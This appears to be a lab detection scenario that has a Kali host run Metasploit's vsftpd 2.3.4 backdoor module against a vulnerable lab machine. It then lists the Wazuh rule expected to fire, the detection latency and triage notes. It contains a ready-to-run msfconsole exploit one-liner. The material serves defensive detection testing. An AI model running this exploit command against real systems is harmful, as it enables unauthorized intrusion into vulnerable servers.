## Scenario 03: Metasploit vsftpd Exploit

**MITRE ATT&CK:** T1190 - Exploit Public-Facing Application  
**Objective:** Detect exploitation attempt of known vulnerable service.

### Attack Steps

**Source:** Kali Attack (192.168.10.11)
**Target:** MS-2 (192.168.10.13)

1. From Kali Attack, launch Metasploit and run the vsftpd 2.3.4 backdoor exploit:
   ```
   msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.10.13; run; exit"
   ```

### Expected Detection

- Rule ID: `2501` (Wazuh built-in — syslog authentication failure)
- Expected latency: `< 60s`
- > **Note:** FTP-specific rules (31xxx series) do **not** fire for MS-2. MS-2 runs sysklogd
  > (Ubuntu 8.04) which sends stripped syslog without RFC 3164 timestamp/hostname; standard
  > FTP decoders cannot parse this format. Rule 2501 fires on the auth-failure syslog line.

### Triage Notes

- True positive: exploit module execution paired with target-side authentication failure from `192.168.10.11`.
- False positive: lab FTP service testing without exploit payloads.
